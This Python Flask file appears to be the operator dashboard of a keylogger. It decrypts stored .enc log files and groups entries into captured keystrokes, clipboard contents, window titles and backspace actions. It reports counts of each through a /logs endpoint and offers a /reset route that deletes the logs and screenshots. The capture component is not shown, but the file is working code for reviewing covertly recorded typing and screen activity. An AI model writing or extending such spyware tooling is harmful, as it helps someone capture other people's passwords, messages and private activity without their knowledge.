from flask import Flask, render_template, jsonify
import os
from crypto_utils import decrypt_data

app = Flask(__name__)

LOG_DIR = "logs"


def parse_log_line(line):
    if "[WINDOW]" in line:
        return {"type": "window", "text": line}
    elif "[CLIPBOARD]" in line:
        return {"type": "clipboard", "text": line}
    elif "[BACKSPACE]" in line:
        return {"type": "action", "text": line}
    else:
        return {"type": "key", "text": line}


def read_logs():
    logs = []

    files = sorted(os.listdir(LOG_DIR), reverse=True)

    for file in files:
        if file.endswith(".enc"):
            with open(os.path.join(LOG_DIR, file), "rb") as f:
                lines = f.readlines()
                for line in lines:
                    try:
                        decrypted = decrypt_data(line.strip())
                        logs.append(parse_log_line(decrypted))
                    except:
                        pass

    return logs


# 🆕 RESET FUNCTION
def clear_logs():
    for file in os.listdir(LOG_DIR):
        path = os.path.join(LOG_DIR, file)

        # delete encrypted logs + screenshots
        if file.endswith(".enc") or file.endswith(".png"):
            try:
                os.remove(path)
            except:
                pass


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/logs")
def get_logs():
    logs = read_logs()

    stats = {
        "window": sum(1 for l in logs if l["type"] == "window"),
        "clipboard": sum(1 for l in logs if l["type"] == "clipboard"),
        "action": sum(1 for l in logs if l["type"] == "action"),
        "key": sum(1 for l in logs if l["type"] == "key"),
    }

    return jsonify({"logs": logs[-200:], "stats": stats})


# 🆕 RESET ROUTE
@app.route("/reset", methods=["POST"])
def reset():
    clear_logs()
    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(debug=True)